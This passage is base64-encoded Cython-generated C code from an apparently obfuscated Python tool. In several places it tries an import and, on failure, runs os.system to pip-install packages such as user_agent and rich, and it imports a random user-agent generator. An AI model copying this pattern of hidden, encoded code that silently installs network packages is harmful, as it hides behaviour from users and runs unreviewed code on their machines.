gpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBfX3B5eF9MMzFfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRldGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMzRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMzRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRldGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMzRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzMiwgX19weXhfTDM0X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIGdvdG8gX19weXhfTDM5X3RyeV9lbmQ7XG4gICAgX19weXhfTDM0X2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygib3AiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNSwgJl9fcHl4X3RfMywgJl9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgMzMsIF9fcHl4X0wzNl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMzQsIF9fcHl4X0wzNl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDM2X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmV9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzQsIF9fcHl4X0wzNl9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0wzNV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MMzZfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wzNV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgX19weXhfTDM5X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2LCBfX3B5eF9MNDJfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF8yLCBfX3B5eF90XzIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNiwgX19weXhfTDQyX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2LCBfX3B5eF9MNDJfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2LCBfX3B5eF9MNDJfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgZ290byBfX3B5eF9MNDdfdHJ5X2VuZDtcbiAgICBfX3B5eF9MNDJfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF8yLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCAzNywgX19weXhfTDQ0X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEwID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMzgsIF9fcHl4X0w0NF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICBfX3B5eF90XzYgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF91c2VyX2FnZW50fTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgZ290byBfX3B5eF9MNDNfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDQ0X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNDNfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIF9fcHl4X0w0N190cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDUwX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfYWdlbnRfMiwgX19weXhfdF81LCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDAsIF9fcHl4X0w1MF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDUwX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYiwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MNTBfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgZ290byBfX3B5eF9MNTVfdHJ5X2VuZDtcbiAgICBfX3B5eF9MNTBfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8yLCAmX19weXhfdF81LCAmX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCA0MSwgX19weXhfTDUyX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzkgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0w1Ml9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQyLCBfX3B5eF9MNTJfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfanNvbn07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0w1Ml9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w1MV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MNTJfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w1MV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgX19weXhfTDU1X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29uc29sZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ0LCBfX3B5eF9MNThfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmljaF9jb25zb2xlLCBfX3B5eF90XzMsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDU4X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29uc29sZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ0LCBfX3B5eF9MNThfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29uc29sZSwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ0LCBfX3B5eF9MNThfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDU